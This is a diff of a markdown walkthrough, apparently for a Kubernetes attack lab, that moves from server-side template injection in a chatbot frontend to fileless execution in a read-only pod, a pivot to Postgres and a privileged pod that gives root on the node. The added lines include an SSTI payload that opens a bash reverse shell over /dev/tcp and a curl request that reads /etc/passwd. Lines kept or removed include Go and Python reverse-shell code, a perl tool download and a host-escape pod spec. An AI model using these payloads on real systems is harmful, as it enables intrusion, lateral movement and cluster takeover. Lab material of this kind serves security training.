@@ -8,14 +8,13 @@
  - [Exploring the Read-Only Web Frontend](#item-one)
  - [Dealing with Read-Only File System](#item-two)
  - [Introduction to fee](#item-three)
- - [Searching for pods on the network](#item-scan)
  - [Interacting with postgesql](#item-five)
  - [Playing with kube-api insite a pod with `cluster-admin`](#item-six)
  - [Tools](#item-seven)
  
 ## Synopsis
 
-In this tutorial, we'll explore the concept of fileless execution within Kubernetes environments, particularly focusing on pods deployed with read-only root file systems. This technique is crucial for scenarios where traditional file manipulation is restricted, offering an alternative method for executing tasks. Tom was here!
+In this tutorial, we'll explore the concept of fileless execution within Kubernetes environments, particularly focusing on pods deployed with read-only root file systems. This technique is crucial for scenarios where traditional file manipulation is restricted, offering an alternative method for executing tasks.  
 
 ## Skills Requried
 - Linux Enumeration
@@ -54,19 +53,23 @@ Content-Length: 1833
 Connection: close
 ```
 <a id="item-one"></a>
-## Step 1: Exploring the Read-Only Web Frontend
-First, we access the web frontend and exploit a SSTI to gain a foot hold on the system. The text box is subject to a basic Template injection. 
-We cant test injection for read:
+## Step 1: Exploring the Web Frontend
+First, we access the web frontend and exploit a SSTI to gain a foothold on the system.
 
-```
-a {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
-```
-We see an error when trying to write a file.
-```bash
-touch hi.txt
-touch: cannot touch 'hi.txt': Read-only file system
+![N|Solid](./images/Chatbot.png) 
+
+There is a basic filter which does not allow "{{" at the start of the input. We can bypass the filter with this payload:
+```python 
+a{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i &>/dev/tcp/<IP>/<PORT> <&1"').read()}}
 ```
 
+Alternativly you can use Burp to send a POST request like this:
+```sh
+curl -i -s -k -X $'POST' \
+    -H $'Host: 192.168.64.18:30007' -H $'Content-Length: 153' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://192.168.64.18:30007' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://192.168.64.18:30007/get_response' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
+    --data-binary $'conversation=A&user_input=a+%7B%7B+self._TemplateReference__context.cycler.__init__.__globals__.os.popen%28%27cat+%2Fetc%2Fpasswd%27%29.read%28%29+%7D%7D' \
+    $'http://192.168.64.18:30007/get_response'
+```
 ## Step 2: Enumerating our envioment 
 
 By checking the environment variables we can deduce that we are in a Kubernetes environment. 
@@ -76,6 +79,11 @@ KUBERNETES_PORT_443_TCP_PROTO=tcp
 KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
 ```
 
+We see an error when trying to write a file.
+```bash
+touch hi.txt
+touch: cannot touch 'hi.txt': Read-only file system
+```
 Observations:
 * The environment variables suggest we're on a Kubernetes node.
 * Standard paths are available, but no write access to the filesystem.
@@ -84,7 +92,7 @@ Observations:
 
 ## Step 3: Dealing with Read-Only File System
 
-(https://breakdance.github.io/breakdance/) shows how we can we can utilize tmpfs mounted filesystems for temporary file manipulation. We will be using the memfd syscall to create in memory elf64 binary files. Then execute those files without touching the file system. As we are not leaving any traces or files (IoC) on the file system. We will try to confine our actives in memory when possible.
+(https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless#read-only-no-exec-scenario) shows how we can we can utilize tmpfs mounted filesystems for temporary file manipulation. We will be using the memfd syscall to create in memory elf64 binary files. Then execute those files without touching the file system. As we are not leaving any traces or files (IoC) on the file system. We will try to confine our actives in memory when possible.
 
 Check what filesystems are mounted with tmpfs as paths may vary.
 ```sh
@@ -98,30 +106,19 @@ We can interact with `/dev/shm` for our purposes to execute scripts with python 
 We can see what version of python is available on the system with `python --version`
 
 ---
-We can get a reverse shell by base64 encoding writing the python3 shell in [tools](#item-seven) to /dev/shm
-
-Example in burp:
-![N|Solid](./images/Request.png)
-
-Start Listener `nc -l 45678` for example and execute shell:
-
-```sh
-a {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /dev/shm/rev.py | base64 -d | python3').read() }}
-```
-
----
-The `env` command shows that we can see there is a service frontending Postgres. Hopefully there are no Network Policys and we can connect to it... but how
----
 <a id="item-three"></a>
 # Introduction to Fee: https://pypi.org/project/fee/ 
 Execute ELF files on a machine without dropping an ELF.
 
-Create a Docker image to convert our elf64 binaries into interperted code 
-`Docker Image`:
+Create a `Docker image` to convert our elf64 binaries into interperted code:
 ```sh
 FROM python:3
 
 RUN pip install --user fee
+```
+and build it:
+```sh
+$ docker build -t fee .
 ```
 ---
 
@@ -132,7 +129,7 @@ $ file /tmp/kid
 /tmp/kid: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9db18ea3b88543130f870aa071d9216955c2a541, for GNU/Linux 3.2.0, stripped
 ```
 
-Next run the fee docker image on the binary direct the `default` python output to a file
+Next run the fee docker image on the binary and direct the `default` python output to a file
 ```sh
 $ docker run -v /tmp/:/host -it localhost:5000/docker-fee:0.1 /bin/sh -c '/root/.local/lib/python3.11/site-packages/fee.py /host/kid'  > kid.py
 ```
@@ -155,34 +152,35 @@ For a glibc version of 2.34 I'm using the `ubuntu:16.04` docker image to cp my b
   - Arguments: fdesc ,'process name', {"env=variables"}
 ---
 
-## Searching for other pods (scanning)
-<a id="item-scan"></a>
-By default Kubernetes pod network is completly wide open. Think of all pods as being on a shared vlan. 
-
-We need to port ping the subnet (get local subnet via `/proc/net/fib_trie`) in search of services
-
 ## Step 5: Interacting with a Discovered Postgres Server
 
 <a id="item-five"></a>
-After identifying a Postgres service via enviorment variables, we'll execute a postgres client binary writen in `go`:
+After identifying a Postgres service via enviorment variables, we'll execute a postgres client binary writen in `go` on the target:
 
-Update the psqlrev.go script with your own listener ip and port.
+Update the `psqlrev.go` script with your own listener ip and port. Now you need to build the go script with specific build flags, to get a static build. We need this to make sure that the binary gets compiled with a glibc version equal or less then the one on the target.
+
+```sh
+$ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build exploit.go
+```
 
 Use the `fee` command for execution:
 
 ```sh
-docker run -v /tmp/:/host -it localhost:5000/docker-fee:0.1 /bin/sh -c '/root/.local/lib/python3.11/site-packages/fee.py /host/psqlrev'  > psqlrev.py
+$ docker run -v /tmp/:/host -it localhost:5000/docker-fee:0.1 /bin/sh -c '/root/.local/lib/python3.11/site-packages/fee.py /host/psqlrev'  > psqlrev.py
 ```
 ## run the psqlrev.py and attempt to gain a reverse shell
+Test it like this:
 ```bash
-cat psqlrev.py | kubectl -n frontend exec -it app-6f85bcbff4-m6zht -- python3
+$ cat psqlrev.py | kubectl -n frontend exec -it app-6f85bcbff4-m6zht -- python3
 ```
 You should now be on the backend server!
+
+To get revshell on the target through your foothold, you need to transfer the `psqlrev.py` file over to the web pod and execute it in `/dev/shm`.
 
 ----
 ## Step 6 
 <a id="item-six"></a>
-Now that we have laterally pivited to backend server that does not have a read-only mount we are going to pull `kubectl` command 
+Now that we have laterally pivoted to the postgres-backend-server that does not have a read-only mount we are going to pull `kubectl` command 
 with perl from or attack host or from the interweb. We are using perl as our interpreter as python3 is not installed on postgres container. With diverse workloads we need many different tools.
 
 ```perl
@@ -203,11 +201,11 @@ if ($response->{success}) {
 }
 ```
 
-Once we can have kubectl installed and notice we can create pod we will create an attack pod to gain root one Kubernetes worker node.
+Once we can have kubectl installed and notice we can create pods, we will create an attack pod to gain root on Kubernetes worker node.
 
 ## Setup a `bad` pod from Bishopfox in a oneliner
 ```sh
-kubectl run everything-allowed-exec-pod --image=ubuntu --overrides='
+kubectl run everything-allowed-exec-pod --image=alpine --overrides='
 {
   "apiVersion": "v1",
   "spec": {
@@ -217,7 +215,7 @@ kubectl run everything-allowed-exec-pod --image=ubuntu --overrides='
     "containers": [
       {
         "name": "everything-allowed-pod",
-        "image": "ubuntu",
+        "image": "alpine",
         "securityContext": {
           "privileged": true
         },
@@ -249,6 +247,7 @@ kubectl exec -it <badpod> -- /bin/sh -c 'chroot /host'
 ```
 # Tools
 <a id="item-seven"></a>
+
 ## Postgres Reverse Shell
 ```go
 package main
@@ -303,39 +302,7 @@ func main() {
     log.Println("Commands executed successfully")
 }
 ```
-## Python 3 Reverse Shell
-```python
-import socket
-import subprocess
-import os
 
-# Set the server's IP address and port number
-SERVER_HOST = '127.0.0.1'
-SERVER_PORT = 1337
-
-# Create a socket object
-s = socket.socket()
-
-# Connect to the server
-s.connect((SERVER_HOST, SERVER_PORT))
-
-# Send a message to the server saying we've connected
-s.send(str.encode("Connection established!"))
-
-# Receive commands from the remote server and run on the local machine
-while True:
-    # Receive command from the server
-    command = s.recv(1024).decode()
-
-    # If the received command is exit, close the socket and exit
-    if command.lower() == 'exit':
-        s.close()
-        break
-    # Execute the command and retrieve the results
-    output = subprocess.getoutput(command)
-    # Send the results back to the server
-    s.send(str.encode(output + "\n"))
-```
 ## Perl Curl
 ```sh
 #!/usr/bin/perl use strict;
